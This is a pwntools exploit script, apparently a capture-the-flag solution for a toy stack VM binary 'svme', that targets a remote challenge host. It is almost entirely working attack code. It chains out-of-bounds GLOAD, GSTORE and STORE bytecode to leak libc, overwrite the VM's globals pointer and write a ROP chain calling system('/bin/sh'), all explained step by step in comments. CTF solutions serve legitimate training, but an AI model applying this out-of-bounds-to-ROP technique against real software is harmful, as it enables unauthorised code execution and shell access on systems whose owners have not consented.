from pwn import *

s = lambda x: io.send(x)

elf = context.binary = ELF('svme_patched', checksec = False)
libc = ELF('libc.so.6', checksec = False)

def start():
    gs = '''
        b *vm_exec+1738
    '''

    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote('47.243.140.252', 1337)
    else:
        return process(elf.path) 


# OPCODES
IADD_OP   = 0x1
ISUB_OP   = 0x2
IMUL_OP   = 0x3
ILT_OP    = 0x4
IEQ_OP    = 0x5
BR_OP     = 0x6
BRT_OP    = 0x7
BRF_OP    = 0x8
ICONST_OP = 0x9
LOAD_OP   = 0x0a
GLOAD_OP  = 0x0b
STORE_OP  = 0x0c
GSTORE_OP = 0x0d
PRINT_OP  = 0x0e
POP_OP    = 0x0f
CALL_OP   = 0x10
RET_OP    = 0x11
HLT_OP    = 0x12

def parse_opcode(op):
    return p32(op)

def compile(shellcode):
    bytecode = b''
    for code in shellcode:
        bytecode += parse_opcode(code)
    return bytecode
    
io = start()

shellcode = [    
    # load the address of vm->code to the stack using GLOAD out-of-bounds vulnerability.
    # we can copy 4 bytes each time so we have to copy both the upper 4 and lower 4 bytes of vm->code.
    GLOAD_OP, 0xffffffff - 0x840 + 1 + 1,
    GLOAD_OP, 0xffffffff - 0x840 + 1,
    ICONST_OP, 0x218, # offset from vm->code address to main return address.
    IADD_OP, # add the offset.
    
    # the same out-of-bounds vulnerabilities exist for STORE & GSTORE instructions too.
    GSTORE_OP, 0xffffffff - 0x83c + 1, # here we have overwritten the 4 lower bytes of vm->globals variable.
    # after GSTORE we have corrupted vm->globals so we can't use GSTORE anymore, because GSTORE relies in vm->globals.
    # a work around is to use STORE insted.
    # you can implement this attack with STORE instructions only but here we want to use all of our bugs :)
    STORE_OP, 0xffffffff - 0x3e0 + 1,  # here we have overwritten the 4 higher bytes of vm->globals variable.
    
    # now vm->globals points to main's return address which currently is __libc_main_start+243
    
    GLOAD_OP, 0x0,
    ICONST_OP, 0x20b3, # __libc_main_start+243 offset.
    ISUB_OP, # We have calculated libc address.
    
    GSTORE_OP, 0x0, # Store libc starting address for future use.
    # you don't need to save the 4 upper bytes of libc address because main return address is __libc_start_main+243 which already has the upper 4 bytes filled
    # for us.

    # Start of the exploit chain.
    
    # overwrite vm_exec's return address.
    GLOAD_OP, 0x0, # load (4 lower bytes) libc address again.
    ICONST_OP, 0x1b72, # load pop rdi; ret; gadget.
    IADD_OP,

    # vm->globals[0xffffffff - 0x8f] = vm_exec return address
    # so writing after 0xffffffff - 0x8f we can fill a rop chain attack.

    GSTORE_OP, 0xffffffff - 0x8f,  # store first half of the gadget address.
    GLOAD_OP, 0x1, # load second half (upper 4 bytes) of libc address.
    GSTORE_OP, 0xffffffff - 0x8f + 1,  # store second half of the gadget address.
    
    GLOAD_OP, 0x0, # load libc address again.
    ICONST_OP, 0x1925aa, # /bin/sh offset
    IADD_OP,
    
    # Store /bin/sh to the stack for pop rdi; ret; gadget.
    GSTORE_OP, 0xffffffff - 0x8f + 2, 
    GLOAD_OP, 0x1,
    GSTORE_OP, 0xffffffff - 0x8f + 3, 
    
    # Store a simple ret; gadget to the stack to align the stack for system function.
    GLOAD_OP, 0x0, 
    ICONST_OP, 0x3043c, # ret gadget.
    IADD_OP,
    
    # store the ret gadget to the stack.
    GSTORE_OP, 0xffffffff - 0x8f + 4,
    GLOAD_OP, 0x1,
    GSTORE_OP, 0xffffffff - 0x8f + 5,
    
    # store system function to the stack.
    GLOAD_OP, 0x0, 
    ICONST_OP, 0x30410, # system offset
    IADD_OP, 
    
    GSTORE_OP, 0xffffffff - 0x8f + 6,
    GLOAD_OP, 0x1,
    GSTORE_OP, 0xffffffff - 0x8f + 7,
    
    HLT_OP # Terminate the program that is running inside the "virtual machine".
    
    # after hlt instruction the vm_exec function returns to our rop chain.
    # pop rdi; ret; ret; system;
]

bytecode = compile(shellcode)
padding = (512-len(bytecode))*p8(0)
s(bytecode+padding)

io.interactive()